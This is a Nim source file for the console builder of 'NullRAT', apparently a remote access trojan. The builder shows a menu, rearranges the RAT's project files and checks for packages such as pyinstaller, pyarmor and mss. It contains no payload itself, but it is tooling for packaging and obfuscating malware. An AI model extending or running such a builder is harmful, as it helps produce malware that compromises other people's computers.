import std/terminal
import std/os
import std/browsers
import std/osproc
import std/[strutils, strtabs]

proc cls() = 
    discard execShellCmd("cls")

discard execShellCmd("chcp 65001");
cls()
discard execShellCmd("mode con: cols=80 lines=29");

proc cleanWorkingDir() =
    echo ""
    var dirrr = getAppDir();
    setCurrentDir(getAppDir());
    echo getCurrentDir();
    if dirExists(absolutePath("NullRAT")):
        createDir("NullRAT2")
        moveFile(absolutePath("NullRAT" / "custom_icon.ico"), dirrr / "NullRAT2" / "custom_icon.ico")
        moveFile(absolutePath("NullRAT" / "RAT.py"), dirrr / "NullRAT2"    / "RAT.py")
        moveDir(absolutePath("NullRAT" / "modules"), dirrr / "NullRAT2" / "modules")
        moveDir(absolutePath("NullRAT" / "upx"), dirrr / "NullRAT2" / "upx")
        # check existing variables
        if fileExists(absolutePath("NullRAT" / "Variables.py")):
            var inp: char
            while inp != 'Y' or inp != 'y' or inp != 'N' or inp != 'n':
                echo "Existing Variables file found! Preserve? (y/N)"
                inp = getch()
                if inp == 'Y' or inp == 'y':
                    moveFile(absolutePath("NullRAT" / "Variables.py"), dirrr / "NullRAT2" / "Variables.py")
                    break
                else:
                    break
        removeDir("NullRAT")
        moveDir(dirrr / "NullRAT2", dirrr / "NullRAT")
    removeFile("AIO.bat")
    removeFile("AIO_Legacy.bat")
        
    # remove git stuff if downloaded from source
    var inpu: char
    while inpu != 'Y' or inpu != 'y' or inpu != 'N' or inpu != 'n':
        echo "Remove git files? (y/N)"
        inpu = getch()
        if inpu == 'y' or inpu == 'Y':
            removeDir(".git")
            removeFile("README.md")
            removeFile("Getting Variables.md")
            removeFile(".gitignore")
            break
        else:
            break
    removeFile("RAT.exe")
    removeDir("build")
    removeDir("dist")        
    
    cls()
    
proc printName() = 
    echo ""
    stdout.styledWriteLine(fgRed, "  ███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗  █████╗ ████████╗")
    stdout.styledWriteLine(fgRed, "  ████╗  ██║██║   ██║██║     ██║     ██╔══██╗██╔══██╗╚══██╔══╝")
    stdout.styledWriteLine(fgRed, "  ██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝███████║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗██╔══██║   ██║")
    stdout.styledWriteLine(fgRed, "  ██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║██║  ██║   ██║")
    stdout.styledWriteLine(fgRed, "  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝")
    stdout.styledWriteLine(fgRed, "  =========================================================")
    echo ""

proc variablesCreator() = 
	echo "vars"
	
proc packageInstaller() = 
    cls()
    printName()
    stdout.styledWriteLine({styleBright}, "  >> Dependencies Installer <<")
    echo ""
    stdout.styledWriteLine({styleBright}, "[1] Checking for Python...")
    var status: int = execShellCmd("python --version")
    if status == 0:
        echo "Python installed!"
		stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
		var result = execCmdEx("pip freeze")
		var allInstalled: bool = true
		if result.exitCode != 0:
			echo "pip command failed to execute!!"
		else:
			if "pyinstaller==4.10" notin result or "virtualenv" notin result or "disnake" notin result or "requests" notin result or "pyarmor" notin result or "mss" notin result:
				echo "Some dependencies are not installed"
				allInstalled = false
			if allInstalled:
				echo "All packages installed and detected! Proceeding on with variables..."
				sleep(3000)
				variablesCreator()
		
	else:
        echo "Python not installed!\nWould you like to download the recommended python installer? (Y/n): "
        var input: char = getch();
        if input == 'N' or input == 'n':
            echo "NullRAT Builder cannot continue otherwise!!! Exiting..."
            sleep(2000)
            quit(1)
        else:
            openDefaultBrowser("https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
            echo ""
            echo "Your browser should start downloading the installer already."
            echo "Since we do not support automatic installation of python, you have to run the installer manually"
            echo "After running, please tick 'Install for All Users' and  'Add Python 3.8 to PATH', then install it"
            echo "After installing, check if everything is functional by running NullRAT builder again."
            echo ""
            stdout.styledWriteLine({styleBright}, "Exiting in 30 seconds. Thank you for using NullRAT")
            sleep(30000)
            quit(2)
    
proc mainMenu() =
    printName();
    stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
    echo ""
    stdout.styledWriteLine({styleBright}, " Press any key to continue, E to exit and C to clear working directory...")
    var input: char = getch();
    if input == 'E' or input == 'e':
        quit(0)
    elif input == 'C' or input == 'c':
        cleanWorkingDir()
    else:
        packageInstaller()
        
while true:
    mainMenu();
#stdout.styledWriteLine(fgRed, "")